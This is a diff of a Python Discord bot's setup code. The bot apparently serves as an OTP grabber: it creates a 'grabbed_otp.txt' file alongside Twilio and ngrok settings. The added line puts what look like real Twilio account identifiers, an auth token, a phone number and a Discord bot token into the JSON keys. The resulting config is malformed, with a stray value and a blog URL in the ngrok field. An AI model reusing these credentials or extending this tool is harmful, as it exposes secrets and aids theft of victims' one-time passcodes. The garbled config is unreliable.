@@ -1,4 +1,5 @@
 
+
 import time
 import os
 import discord_slash.utils.manage_commands
@@ -12,7 +13,7 @@ from discord.ext import commands
 from discord_slash import SlashCommand, SlashContext
 
 if not 'Config.txt' in os.listdir():
-    open('Config.txt', 'w').write('{"account_sid":"?", "auth_token":"?", "Twilio Phone Number":"+1?", "ngrok_url":"https://you-url.ngrok.io", "server_id":"?", "bot_token":"?"}')
+    open('Config.txt', 'w').write('{"AC5802e54682954e76fca1162a0817010b":"?", "23058174da9ec849ba17dd9a3ed874e9":"?", "+18339232705":"+1?", "ngrok_url":"https://ngrok.com/blog-post/datadog-logs":"?", "MTExOTg3NjAwNTQwMjc3NTU5Mw.GAR9nW.XvRPgsBTzADAQltkjjM1vVIVoDamMTe8oiVK-o":"?"}')
 if not 'grabbed_otp.txt' in os.listdir():
     open('grabbed_otp.txt', 'w').close()
 if not 'Details' in os.listdir():
